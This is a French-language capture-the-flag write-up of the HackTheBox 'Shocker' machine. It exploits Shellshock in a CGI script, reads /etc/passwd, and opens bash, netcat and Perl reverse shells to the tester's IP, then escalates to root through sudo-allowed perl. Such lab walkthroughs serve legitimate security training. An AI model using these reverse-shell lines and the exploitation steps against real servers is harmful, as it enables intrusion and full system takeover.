---
title: HTB | Shocker
description: Shocker, while fairly simple overall, demonstrates the severity of the renowned Shellshock exploit, which affected millions of public-facing servers.
slug: shocker-htb
date: 2025-01-13 00:00:00+0000
#image: cover.png
categories:
 - HackTheBox
tags:
 - Linux
 - Easy
#weight: 1
---

<table style="border:none; width:100%;">
  <tr>
    <!-- Colonne gauche : logo -->
    <td style="border:none; text-align:center; vertical-align:middle; width:150px;">
      <img src="cover.png" alt="Shocker cover" width="120">
    </td>
    <td style="border:none; text-align:center; vertical-align:middle;">
      <table style="margin:auto; border-collapse:collapse; border:1px solid #ddd;">
        <thead>
          <tr>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">Machine name</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">OS</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">IP</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">Difficulty</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">Shocker</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">Linux</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">10.10.10.56</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">Easy</td>
          </tr>
        </tbody>
      </table>
    </td>
  </tr>
</table>

## Enumeration

### nmap
```bash
┌──(kali㉿kali)-[~]
└─$ nmap -sS -sC -sV -An -p- -vvv 10.10.10.56
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-13 05:02 EST

PORT     STATE SERVICE REASON         VERSION
80/tcp   open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
2222/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQD8ArTOHWzqhwcyAZWc2CmxfLmVVTwfLZf0zhCBREGCpS2WC3NhAKQ2zefCHCU8XTC8hY9ta5ocU+p7S52OGHlaG7HuA5Xlnihl1INNsMX7gpNcfQEYnyby+hjHWPLo4++fAyO/lB8NammyA13MzvJy8pxvB9gmCJhVPaFzG5yX6Ly8OIsvVDk+qVa5eLCIua1E7WGACUlmkEGljDvzOaBdogMQZ8TGBTqNZbShnFH1WsUxBtJNRtYfeeGjztKTQqqj4WD5atU8dqV/iwmTylpE7wdHZ+38ckuYL9dmUPLh4Li2ZgdY6XniVOBGthY5a2uJ2OFp2xe1WS9KvbYjJ/tH
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPiFJd2F35NPKIQxKMHrgPzVzoNHOJtTtM+zlwVfxzvcXPFFuQrOL7X6Mi9YQF9QRVJpwtmV9KAtWltmk3qm4oc=
|   256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIC/RjKhT/2YPlCgFQLx+gOXhC6W3A3raTzjlXQMT8Msk
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
```

### Dirsearch & gobuster
Avec dirsearch, on trouve le dossier **cgi-bin** dont l'accès est "forbidden" mais il existe. 
```bash
 dirsearch -u http://shocker.htb                                                                


  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/htb/shocker/reports/http_shocker.htb/_25-01-13_07-35-14.txt

Target: http://shocker.htb/

[07:35:14] Starting: 
[07:35:18] 403 -  297B  - /.ht_wsr.txt                                      
[07:35:18] 403 -  300B  - /.htaccess.bak1                                   
[07:35:18] 403 -  300B  - /.htaccess.orig                                   
[07:35:18] 403 -  302B  - /.htaccess.sample                                 
[07:35:18] 403 -  300B  - /.htaccess.save
[07:35:18] 403 -  301B  - /.htaccess_extra                                  
[07:35:18] 403 -  298B  - /.htaccess_sc
[07:35:18] 403 -  299B  - /.htaccessOLD2
[07:35:18] 403 -  298B  - /.htaccessBAK
[07:35:18] 403 -  300B  - /.htaccess_orig
[07:35:18] 403 -  290B  - /.htm
[07:35:18] 403 -  291B  - /.html                                            
[07:35:18] 403 -  298B  - /.htaccessOLD
[07:35:18] 403 -  296B  - /.htpasswds                                       
[07:35:18] 403 -  300B  - /.htpasswd_test
[07:35:18] 403 -  297B  - /.httr-oauth                                      
[07:35:33] 403 -  294B  - /cgi-bin/                                         
[07:35:56] 403 -  299B  - /server-status                                    
[07:35:57] 403 -  300B  - /server-status/                                   
                                                                             
Task Completed   
```
On peut essayer de trouver des fichiers à l'intérieur avec gobuster et l'extension -x, qui permet de tester toute la liste avec les extensions précisées. Ici, on teste les fichiers dans le dossier cgi-bin avec les extensions "sh", "bin", et "cgi".
```bash
$ gobuster dir -u http://shocker.htb/cgi-bin -t 50 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x sh,pl,bin,cgi
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://shocker.htb/cgi-bin
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              sh,bin,cgi
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/user.sh              (Status: 200) [Size: 118]
Progress: 10557 / 882244 (1.20%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 11293 / 882244 (1.28%)
===============================================================
Finished
===============================================================
```
Bingo ! On trouve un script user.sh.

## Foothold

### Shellshock

Grâce au nom de la machine "shocker" et quelques recherches sur le web, on trouve la vulnérabilité "shellshock" qui permet d'executer du code arbitraire grâce aux fichiers présents dans le dossier **cgi-bin**. On trouve un github permettant de l'exploiter:
```bash
$ python2 shocker.py --Host=shocker.htb --cgi /cgi-bin/user.sh --command whoami

   .-. .            .            
  (   )|            |            
   `-. |--. .-.  .-.|.-. .-. .--.
  (   )|  |(   )(   |-.'(.-' |   
   `-' '  `-`-'  `-''  `-`--''  v1.1 
   
 Tom Watson, tom.watson@nccgroup.trust
 https://www.github.com/nccgroup/shocker
     
 Released under the GNU Affero General Public License
 (https://www.gnu.org/licenses/agpl-3.0.html)
    
    
[+] Single target '/cgi-bin/user.sh' being used
[+] Checking connectivity with target...
[+] Target was reachable
[+] Looking for vulnerabilities on shocker.htb:80
[+] 1 potential target found, attempting exploits
[+] The following URLs appear to be exploitable:
  [1] http://shocker.htb:80/cgi-bin/user.sh
[+] Would you like to exploit further?
[>] Enter an URL number or 0 to exit: ls
[+] The following URLs appear to be exploitable:
  [1] http://shocker.htb:80/cgi-bin/user.sh
[+] Would you like to exploit further?
[>] Enter an URL number or 0 to exit: 1
[+] Entering interactive mode for http://shocker.htb:80/cgi-bin/user.sh
[+] Enter commands (e.g. /bin/cat /etc/passwd) or 'quit'
  > whoami
  > No response
  > id
  > No response
  > /bin/id
  > No response
  > /bin/cat /etc/passwd
  < root:x:0:0:root:/root:/bin/bash
  < daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
  < bin:x:2:2:bin:/bin:/usr/sbin/nologin
  < sys:x:3:3:sys:/dev:/usr/sbin/nologin
  < sync:x:4:65534:sync:/bin:/bin/sync
  < games:x:5:60:games:/usr/games:/usr/sbin/nologin
  < man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
  < lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
  < mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
  < news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
  < uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
  < proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
  < www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
  < backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
  < list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
  < irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
  < gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
  < nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
  < systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
  < systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
  < systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
  < systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
  < syslog:x:104:108::/home/syslog:/bin/false
  < _apt:x:105:65534::/nonexistent:/bin/false
  < lxd:x:106:65534::/var/lib/lxd/:/bin/false
  < messagebus:x:107:111::/var/run/dbus:/bin/false
  < uuidd:x:108:112::/run/uuidd:/bin/false
  < dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
  < sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
  < shelly:x:1000:1000:shelly,,,:/home/shelly:/bin/bash
  > sh -i >& /dev/tcp/10.10.14.42/6666 0>&1
  > No response
  > sh -i >& /dev/tcp/10.10.14.42/6666 0>&1
  > No response
  > python3 --version
  > No response
  > python3 --version >& /dev/tcp/10.10.14.42/6666 0>&1
  > No response
  > python3 --version >& /dev/tcp/10.10.14.42/6666 0>&1
  > No response
  > nc 10.10.14.42 6666 -e sh
  > No response
  > locate nc                                     
  > No response
  > /bin/cat /home/*/user.txt
  < c4bf.....3bf6
  > 
```

### Shell as shelly
```bash
....
  > /bin/bash -i >& /dev/tcp/10.10.14.42/6666 0>&1                     
  > No response
  > 

--------------------------

$ nc -lnvp 6666
listening on [any] 6666 ...
connect to [10.10.14.42] from (UNKNOWN) [10.10.10.56] 40886
bash: no job control in this shell
shelly@Shocker:/usr/lib/cgi-bin$ whoami
whoami
shelly
```

## Privilege Escalation

### Enumeration
On peut executer n'importe quel script perl en tant que root... J'ai donc récupérer un reverse shell en perl et je l'ai executé.
```bash
shelly@Shocker:/tmp$ sudo -l
Matching Defaults entries for shelly on Shocker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl
```

### Perl as root
```bash
shelly@Shocker:/tmp$ cat root.pl 
use Socket;$i="10.10.14.42";$p=1337;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("sh -i");};
shelly@Shocker:/tmp$ sudo /usr/bin/perl root.pl

------------------------------------------------------------

$ nc -lnvp 1337
listening on [any] 1337 ...
connect to [10.10.14.42] from (UNKNOWN) [10.10.10.56] 59474
## whoami
root
## python3 -c "import pty;pty.spawn('/bin/bash')"
root@Shocker:/tmp# export TERM=xterm
export TERM=xterm
root@Shocker:/tmp# ^Z
zsh: suspended  nc -lnvp 1337
                                                                                                                                                                                                                                   
┌──(kali㉿kali)-[~/htb/shocker/shocker]
└─$ stty raw -echo; fg
[1]  + continued  nc -lnvp 1337

root@Shocker:/tmp# 
root@Shocker:/tmp# whoami
root
root@Shocker:/tmp# cd /root
root@Shocker:~# ls
root.txt
root@Shocker:~# cat root.txt 
adcd.....c16c
```
## Bonus
### Enumeration shellshock vuln with nmap script
```bash
┌──(kali㉿kali)-[~/htb/shocker]
└─$ locate nse | grep shellshock
/usr/share/nmap/scripts/http-shellshock.nse

┌──(kali㉿kali)-[~/htb/shocker]
└─$ cat /usr/share/nmap/scripts/http-shellshock.nse | grep nmap
-- nmap -sV -p- --script http-shellshock <target>
-- nmap -sV -p- --script http-shellshock --script-args uri=/cgi-bin/bin,cmd=ls <target>
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"

┌──(kali㉿kali)-[~/htb/shocker]
└─$ nmap -sV -p80 --script http-shellshock --script-args uri=/cgi-bin/user.sh,cmd=ls shocker.htb
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-13 08:33 EST
Nmap scan report for shocker.htb (10.10.10.56)
Host is up (0.019s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-shellshock: 
|   VULNERABLE:
|   HTTP Shellshock vulnerability
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2014-6271
|       This web application might be affected by the vulnerability known
|       as Shellshock. It seems the server is executing commands injected
|       via malicious HTTP headers.
|             
|     Disclosure date: 2014-09-24
|     Exploit results:
|       <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
|   <html><head>
|   <title>500 Internal Server Error</title>
|   </head><body>
|   <h1>Internal Server Error</h1>
|   <p>The server encountered an internal error or
|   misconfiguration and was unable to complete
|   your request.</p>
|   <p>Please contact the server administrator at 
|    webmaster@localhost to inform them of the time this error occurred,
|    and the actions you performed just before this error.</p>
|   <p>More information about this error may be available
|   in the server error log.</p>
|   <hr>
|   <address>Apache/2.4.18 (Ubuntu) Server at shocker.htb Port 80</address>
|   </body></html>
|   
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-7169
|       http://seclists.org/oss-sec/2014/q3/685
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271
|_      http://www.openwall.com/lists/oss-security/2014/09/24/10

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.77 seconds
```